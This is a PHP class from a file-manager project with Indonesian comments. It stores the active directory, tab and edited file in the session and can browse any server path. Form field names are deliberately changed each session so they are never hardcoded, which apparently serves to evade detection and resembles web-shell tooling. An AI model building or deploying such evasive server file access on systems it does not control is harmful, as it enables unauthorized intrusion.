<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/PathManager.php                               |
// |  Mengelola state navigasi: path aktif, action tab, dan edit file. |
// |                                                                    |
// |  varnaming.md: Field 'loc', 'path', 'dir', 'dest' diganti via    |
// |  session key registry → field name berubah tiap session.          |
// +------------------------------------------------------------------+

declare(strict_types=1);

class PathManager {

    /**
     * Handle POST navigation → simpan ke session → redirect (PRG).
     * Baca field name dari $_sk — tidak ada hardcoded 'loc', 'path', 'dir'.
     */
    public function handlePRG(): void {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;

        $sk = &$GLOBALS['_sk'];

        // Simpan lokasi & tab mode ke session (base64 agar karakter path aman)
        if (isset($_POST[$sk['lc']])) {
            $_SESSION['sp'] = base64_encode($_POST[$sk['lc']]);
        }
        if (isset($_POST[$sk['md']])) {
            $_SESSION['sa'] = base64_encode($_POST[$sk['md']]);
        }

        // Edit file view
        if (isset($_POST[$sk['vw']])) {
            $_SESSION['_ve'] = base64_encode($_POST[$sk['vw']]);
        } else {
            unset($_SESSION['_ve']);
        }

        $penanda = $sk['nv'] ?? '';

        // Hanya lakukan PRG redirect jika ini murni navigasi (ada penanda nv & bukan POST aksi)
        if ($penanda !== '' && isset($_POST[$penanda])) {
            $hasAction = !empty($_POST[$sk['fo']]) || !empty($_POST[$sk['do']])
                || !empty($_POST[$sk['xo']]) || !empty($_POST[$sk['no']])
                || !empty($_POST[$sk['ko']]) || !empty($_POST[$sk['bo']])
                || !empty($_POST[$sk['ef']]) || !empty($_POST[$sk['fc']]);

            if (!$hasAction) {
                header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
                exit;
            }
        }
    }

    /**
     * Fallback GET navigasi (dari link langsung).
     */
    public function handleGetFallback(): void {
        // GET navigation juga pakai session key — field 'lc', 'md', 'vw'
        // Tapi untuk GET, boleh juga pakai alias pendek yang stabil ('loc', 'm')
        // untuk kompatibilitas backward dengan link yang sudah di-generate
        if (isset($_GET['loc'])) {
            $_SESSION['sp'] = base64_encode($_GET['loc']);
        }
        if (isset($_GET['m'])) {
            $_SESSION['sa'] = base64_encode($_GET['m']);
        }
        if (isset($_GET['vw'])) {
            $_SESSION['_ve'] = base64_encode($_GET['vw']);
        }
    }

    /**
     * Resolve path direktori aktif dari session.
     * Fallback ke getcwd() jika session kosong atau path tidak valid.
     */
    public function getCurrentPath(): string {
        $diminta = !empty($_SESSION['sp'])
            ? base64_decode($_SESSION['sp'])
            : getcwd();

        if (!is_string($diminta) || $diminta === '') {
            $diminta = '/';
        }

        // Resolve ke realpath untuk keamanan (path traversal mitigation)
        $jalurNyata = realpath($diminta);
        if ($jalurNyata === false || !is_dir($jalurNyata)) {
            $jalurNyata = is_file($diminta) ? dirname($diminta) : '/';
        }

        $jalur = rtrim((string)$jalurNyata, DIRECTORY_SEPARATOR);
        return $jalur === '' ? '/' : $jalur;
    }

    /**
     * Resolve tab/action aktif dari session.
     */
    public function getCurrentAction(): string {
        return !empty($_SESSION['sa'])
            ? base64_decode($_SESSION['sa'])
            : 'fm';
    }

    /**
     * Resolve file yang sedang di-edit dari session.
     */
    public function getEditFile(): ?string {
        return !empty($_SESSION['_ve'])
            ? base64_decode($_SESSION['_ve'])
            : null;
    }
}
